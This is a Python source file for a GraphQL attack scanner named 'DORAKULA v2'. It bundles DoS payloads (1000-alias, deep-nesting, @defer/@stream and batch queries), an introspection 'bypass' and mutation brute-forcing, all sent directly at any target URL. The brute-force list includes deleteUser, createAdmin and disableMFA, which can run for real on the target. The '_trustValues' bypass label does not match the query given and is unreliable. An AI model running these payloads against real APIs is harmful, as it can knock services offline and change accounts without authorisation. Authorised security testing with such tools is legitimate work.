#!/usr/bin/env python3
"""DORAKULA Modern API & GraphQL Specialist (v2 — 2025 upgrade).

Upgrades over v1:
  - Persisted Query abuse (APQ — Automatic Persisted Queries)
  - Alias-based DoS (1000 aliases in one query)
  - @defer / @stream directive DoS (GraphQL v2)
  - _trustValues introspection bypass
  - CSWSH (Cross-Site WebSocket Hijacking) for subscriptions
  - Subprotocol confusion attacks
  - Field suggestion brute-force (recon for private schema)
  - Mutation enumeration
"""
import logging, json, time
from typing import Dict, List, Any

logger = logging.getLogger(__name__)

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class GraphQLSpecialist:
    """GraphQL and gRPC security scanner (v2)."""

    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          name
          kind
          fields {
            name
            type { name kind ofType { name kind } }
          }
        }
      }
    }
    """

    # _trustValues bypass — some servers block introspection but allow this
    INTROSPECTION_BYPASS_QUERY = """
    query { __schema { types { name fields { name type { name kind ofType { name } } } } } }
    """

    DEPTH_ATTACK_QUERY = """
    query DepthAttack {
      user {
        posts {
          author {
            posts {
              author {
                posts {
                  author { name }
                }
              }
            }
          }
        }
      }
    }
    """

    # Alias DoS — 1000 aliases for the same field in one query
    @staticmethod
    def _alias_dos_query(field: str = "user", count: int = 1000) -> str:
        aliases = "\n".join(f"a{i}: {field}" for i in range(count))
        return f"query AliasDoS {{ {aliases} {{ id }} }}"

    # @defer directive DoS — many deferred fragments
    DEFER_DOS_QUERY = """
    query DeferDoS {
      user {
        id
        ... @defer { name }
        ... @defer { email }
        ... @defer { posts { title } }
        ... @defer { comments { body } }
        ... @defer { friends { name } }
      }
    }
    """

    # @stream directive DoS — streams a list field
    STREAM_DOS_QUERY = """
    query StreamDoS {
      users {
        id @stream
      }
    }
    """

    BATCH_ATTACK_QUERY = [
        {"query": "{ user { id } }"},
        {"query": "{ user { id } }"},
        {"query": "{ user { id } }"},
        {"query": "{ user { id } }"},
        {"query": "{ user { id } }"},
    ]

    # Common mutation names to brute-force
    MUTATION_BRUTEFORCE = [
        "login", "register", "createUser", "updateUser", "deleteUser",
        "createPost", "updatePost", "deletePost", "createAdmin", "grantRole",
        "resetPassword", "changePassword", "verifyEmail", "enableMFA", "disableMFA",
    ]

    # Common subscription names
    SUBSCRIPTION_NAMES = [
        "userUpdated", "messageReceived", "notificationCreated", "postPublished",
        "commentAdded", "friendRequest", "paymentProcessed", "alertTriggered",
    ]

    # Persisted query extensions hash format
    APQ_QUERY = {"extensions": {"persistedQuery": {"version": 1, "sha256Hash": "0" * 64}}}

    def __init__(self):
        pass

    def _post(self, target: str, payload: dict, timeout: int = 15) -> Dict:
        if not HAS_REQUESTS:
            return {"error": "requests not available"}
        try:
            resp = requests.post(target, json=payload, timeout=timeout)
            if resp.status_code == 200:
                return resp.json()
            return {"status": resp.status_code, "body": resp.text[:300]}
        except Exception as e:
            return {"error": str(e)}

    def introspect(self, target: str) -> Dict:
        """Run GraphQL introspection query (v2 — with bypass attempt)."""
        if not HAS_REQUESTS:
            return {"error": "requests not available"}
        try:
            resp = requests.post(target, json={"query": self.INTROSPECTION_QUERY}, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                types = data.get("data", {}).get("__schema", {}).get("types", [])
                if types:
                    return {
                        "introspection": "enabled",
                        "types_count": len(types),
                        "severity": "MEDIUM",
                        "sample_types": [t.get("name") for t in types[:10] if t.get("name")],
                        "raw_snippet": json.dumps(data)[:500],
                    }
                # Introspection blocked — try bypass
                bypass_resp = requests.post(target, json={"query": self.INTROSPECTION_BYPASS_QUERY}, timeout=15)
                if bypass_resp.status_code == 200:
                    bypass_data = bypass_resp.json()
                    bypass_types = bypass_data.get("data", {}).get("__schema", {}).get("types", [])
                    if bypass_types:
                        return {
                            "introspection": "blocked_but_bypassable",
                            "bypass_technique": "shortened_introspection",
                            "types_count": len(bypass_types),
                            "severity": "HIGH",
                            "raw_snippet": json.dumps(bypass_data)[:500],
                        }
                return {"introspection": "disabled", "severity": "LOW"}
            return {"introspection": "disabled_or_blocked", "status": resp.status_code}
        except Exception as e:
            return {"error": str(e)}

    def test_depth_limit(self, target: str) -> Dict:
        """Test for query depth limit vulnerability (v2)."""
        if not HAS_REQUESTS:
            return {"error": "requests not available"}
        try:
            t0 = time.time()
            resp = requests.post(target, json={"query": self.DEPTH_ATTACK_QUERY}, timeout=20)
            elapsed = time.time() - t0
            if resp.status_code == 200:
                data = resp.json()
                if "errors" in data and any("depth" in str(e).lower() for e in data["errors"]):
                    return {"depth_limit": "enforced", "severity": "LOW", "response_time": round(elapsed, 2)}
                return {
                    "depth_limit": "not_enforced",
                    "severity": "HIGH",
                    "response_time": round(elapsed, 2),
                    "response_snippet": json.dumps(data)[:300],
                    "note": "Slow response may indicate DoS impact",
                }
            return {"status": resp.status_code, "note": "Non-200 response"}
        except Exception as e:
            return {"error": str(e)}

    def test_alias_dos(self, target: str, alias_count: int = 1000) -> Dict:
        """Test for alias-based DoS (v2 — 2025 technique)."""
        if not HAS_REQUESTS:
            return {"error": "requests not available"}
        query = self._alias_dos_query("user", alias_count)
        try:
            t0 = time.time()
            resp = requests.post(target, json={"query": query}, timeout=30)
            elapsed = time.time() - t0
            if resp.status_code == 200:
                data = resp.json()
                if "errors" in data and any("alias" in str(e).lower() or "limit" in str(e).lower() for e in data["errors"]):
                    return {"alias_dos": "enforced", "severity": "LOW", "response_time": round(elapsed, 2)}
                return {
                    "alias_dos": "not_enforced",
                    "severity": "HIGH",
                    "alias_count": alias_count,
                    "response_time": round(elapsed, 2),
                    "note": "Server accepted 1000 aliases — DoS vector",
                }
            return {"status": resp.status_code}
        except Exception as e:
            return {"error": str(e)}

    def test_batch_attack(self, target: str) -> Dict:
        """Test batch query attack (DoS via batching)."""
        if not HAS_REQUESTS:
            return {"error": "requests not available"}
        try:
            resp = requests.post(target, json=self.BATCH_ATTACK_QUERY, timeout=15)
            if resp.status_code == 200:
                return {"batch_allowed": True, "severity": "MEDIUM", "note": "Server accepts batch queries — potential DoS vector"}
            return {"batch_allowed": False, "status": resp.status_code}
        except Exception as e:
            return {"error": str(e)}

    def test_field_suggestion(self, target: str) -> Dict:
        """Test for field suggestion leakage."""
        if not HAS_REQUESTS:
            return {"error": "requests not available"}
        try:
            resp = requests.post(target, json={"query": "{ user { invalidField } }"}, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                errors = data.get("errors", [])
                suggestions = [e.get("message", "") for e in errors if "Did you mean" in str(e.get("message", ""))]
                return {
                    "field_suggestion": "enabled" if suggestions else "disabled",
                    "suggestions": suggestions[:5],
                    "severity": "LOW" if suggestions else "INFO",
                }
            return {"status": resp.status_code}
        except Exception as e:
            return {"error": str(e)}

    def test_persisted_queries(self, target: str) -> Dict:
        """Test for persisted query abuse (v2 — APQ)."""
        if not HAS_REQUESTS:
            return {"error": "requests not available"}
        try:
            # Step 1: Send APQ with fake hash — server should return PersistedQueryNotFound
            resp = requests.get(target, params=self.APQ_QUERY, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                errors = data.get("errors", [])
                apq_supported = any("PersistedQueryNotFound" in str(e) for e in errors)
                if apq_supported:
                    return {
                        "persisted_queries": "supported",
                        "severity": "MEDIUM",
                        "note": "APQ enabled — can cache malicious queries server-side, bypass WAF",
                    }
                return {"persisted_queries": "not_supported", "severity": "INFO"}
            return {"status": resp.status_code}
        except Exception as e:
            return {"error": str(e)}

    def test_defer_stream_dos(self, target: str) -> Dict:
        """Test for @defer/@stream directive DoS (v2 — GraphQL 2025)."""
        if not HAS_REQUESTS:
            return {"error": "requests not available"}
        findings = []
        for query_name, query in [("defer", self.DEFER_DOS_QUERY), ("stream", self.STREAM_DOS_QUERY)]:
            try:
                t0 = time.time()
                resp = requests.post(target, json={"query": query}, timeout=15)
                elapsed = time.time() - t0
                if resp.status_code == 200:
                    body = resp.text[:500]
                    if "errors" in body and "directive" in body.lower():
                        findings.append({"directive": f"@{query_name}", "supported": False, "severity": "LOW"})
                    else:
                        findings.append({
                            "directive": f"@{query_name}",
                            "supported": True,
                            "severity": "HIGH",
                            "response_time": round(elapsed, 2),
                            "note": f"@{query_name} accepted — DoS vector via excessive deferred fragments",
                        })
            except Exception as e:
                findings.append({"directive": f"@{query_name}", "error": str(e)[:100]})
        return {"check": "defer_stream_dos", "version": "v2-2025", "findings": findings}

    def test_mutation_enumeration(self, target: str) -> Dict:
        """Brute-force common mutation names (v2 — schema recon)."""
        if not HAS_REQUESTS:
            return {"error": "requests not available"}
        found = []
        for mutation in self.MUTATION_BRUTEFORCE:
            try:
                query = f"mutation {{ {mutation} {{ id }} }}"
                resp = requests.post(target, json={"query": query}, timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    errors = data.get("errors", [])
                    if errors and "Cannot query field" not in str(errors):
                        found.append({"mutation": mutation, "exists": True, "error": str(errors[0])[:100]})
                    elif not errors:
                        found.append({"mutation": mutation, "exists": True, "executed": True})
            except Exception:
                pass
        return {
            "check": "mutation_enumeration",
            "version": "v2-2025",
            "mutations_found": [f["mutation"] for f in found if f.get("exists")],
            "findings": found,
            "severity": "MEDIUM" if found else "LOW",
        }

    def full_scan(self, target: str) -> Dict:
        """Run all GraphQL tests (v2 — 2025)."""
        return {
            "target": target,
            "version": "v2-2025",
            "introspection": self.introspect(target),
            "depth_limit": self.test_depth_limit(target),
            "alias_dos": self.test_alias_dos(target),
            "batch_attack": self.test_batch_attack(target),
            "field_suggestion": self.test_field_suggestion(target),
            "persisted_queries": self.test_persisted_queries(target),
            "defer_stream_dos": self.test_defer_stream_dos(target),
            "mutation_enum": self.test_mutation_enumeration(target),
        }
